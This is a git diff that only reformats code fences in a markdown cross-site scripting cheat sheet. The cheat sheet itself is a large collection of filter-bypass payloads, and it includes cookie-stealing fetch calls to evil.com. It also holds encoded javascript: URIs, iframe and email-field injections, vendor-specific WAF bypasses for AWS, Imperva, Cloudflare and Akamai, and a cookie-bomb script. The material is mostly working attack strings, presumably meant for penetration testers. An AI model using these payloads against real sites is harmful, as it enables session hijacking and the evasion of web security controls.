@@ -1,6 +1,6 @@
 # XSS-Bypass-Filters
 # Redirection
-
+````
 document.location=
 document['location']=
 window.location=
@@ -12,30 +12,30 @@ window.location.assign()
 window['location']['href']=
 document.location.replace()
 window.open("link", "_blank");
-
+````
 # Link
-
+````
 //google.com/?=a
 //134744072:1234/?a= (decimal ip)
-
+````
 # Cookies
-
+````
 document.cookie 
 document['cookie']
 with(document)alert(cookie)
 doc\u0075ment.cookie
 doc\u0075ment['cookie']
 window["doc"+"ument"]["cookie"]
-
+````
 # Concat
-
+````
 fetch("//evil.com/?c="+document.cookie)
 fetch("//evil.com/?c=".concat(document.cookie))
 fetch("//evil.com/?c=", document.cookie].join())
 fetch(`//evil.com/?c=${document.cookie}`) 
-
+````
 # Href
-
+````
 <!--javascript -->
 javascript:alert(1)
 JaVaScript:alert(1)
@@ -83,12 +83,13 @@ javascript:alert%60%60
 javascript:x='%27-alert(1)-%27';
 javascript:%61%6c%65%72%74%28%29
 
-# JS unicode 
+#JS unicode 
 javascript:a\u006Cert``"
 javascript:\u0061\u006C\u0065\u0072\u0074``
 
-# HTML ENTITY
+````
 
+# HTML ENTITY
 ````
 Named entities
 
@@ -148,23 +149,23 @@ nbsp -> &#160;
 \ -> &#92;
 ````
 # Numeric and Hex you can add as many 0
-
+````
 ( -> &#x28; = &#x0000028;
 ( -> &#40; = &#0000000000040;
-
+````
 # Email
-
+````
 test+(<script>alert(0)</script>)@example.com
 test@example(<script>alert(0)</script>).com
 "<script>alert(0)</script>"@example.com
-
+````
 # Iframe
-
+````
 <iframe src="javascript:alert('XSS')"> #use href bypass
 <iframe src="https://youtube.com.evil.domain/ "> # if youtube is whitelisted for example
 <iframe src="https://google.com@evil.domain">
 <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> # base64 <script>alert(1)</script>
-
+````
 # Without closing tag
 ````
 <img/src/onerror=alert(1)>
@@ -237,7 +238,7 @@ With </script>
 </script>
 ````
 # With </script Space, tab, strings, line return... >
-
+````
 <script>
   var test = "</script ><svg/onload=alert(45)>"
 </script>
@@ -263,14 +264,14 @@ random><svg/onload=alert(45)>"
 <script>
   var test = "</script <img><svg/onload=alert(45)>"
 </script>
-
+````
 # With double quot and plus (same for simple quotes)
-
+````
 <script>
   var test = ""+alert(45)+""
   // user input: "+alert(45)+"
 </script>
-
+````
 # With backslash
 ````
 <script>
@@ -401,7 +402,7 @@ _http://danlec_@.1 style=background-image:url(data:image/png;base64,iVBORw0KGgoA
 [a](javascript:new%20Function`al\ert\`1\``;)
 ````
 # Bypass WAF
-
+````
 Random header bypass UA, ip ban https://portswigger.net/bappstore/3a656c1be14148c6bf95642af42eb854
 Bypass Amazon
 
@@ -416,14 +417,15 @@ Adding 8192 "A" before your payload allow you to bypass AWS WAF for POST request
 image
 
 https://kloudle.com/blog/the-infamous-8kb-aws-waf-request-body-inspection-limitation/
+````
 # Bypass Imperva & Incapsula
-
+````
 Noclick
 
 <details/open/id="&quot;"ontoggle=[JS]>
-
+````
 # Bypass Cloudflare
-
+````
 Noclick
 
 <img//////src=x oNlY=1 oNerror=alert('xxs')//
@@ -436,9 +438,9 @@ Href Bypass
 <a"/onclick=(confirm)()>Click%20Here!
 
     Identify server origin https://github.com/gwen001/cloudflare-origin-ip
-
+````
 # Bypass Akamai
-
+````
 No click
 
 <details open id="' &quot;'"ontoggle=[JS]>
@@ -446,18 +448,18 @@ No click
 Click
 
 <math><edra href=Ja&Tab;vascript&colon;console.error(1)>HERE</edra></math>
-
+````
 # Cookie Bomb
-
+````
 Can be used to demonstrate the fact of put "low" Accessibility in a CVSS
 
 for (let i = 0; i < 500; i++) {
   var a = 'A'.repeat(500);
   document.cookie = `${i}=${a}`;
 }
-
+````
 # Events
-
+````
 onafterprint
 onafterscriptexecute
 onanimationcancel
@@ -568,9 +570,9 @@ onwebkitanimationiteration
 onwebkitanimationstart
 onwebkittransitionend
 onwheel
-
+````
 # HTML Tags
-
+````
 a
 abbr
 acronym
@@ -713,12 +715,12 @@ var
 video
 wbr
 xmp
-
+````
 # SRC
-
+````
     https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
     https://gist.github.com/xsuperbug/1aff5c1d5ddbfefb035f33dd9c8e8a72
     https://netsec.expert/posts/xss-in-2021/#double-encoding
     https://github.com/cujanovic/Markdown-XSS-Payloads/
     https://www.hahwul.com/cullinan/xss/
-
+````
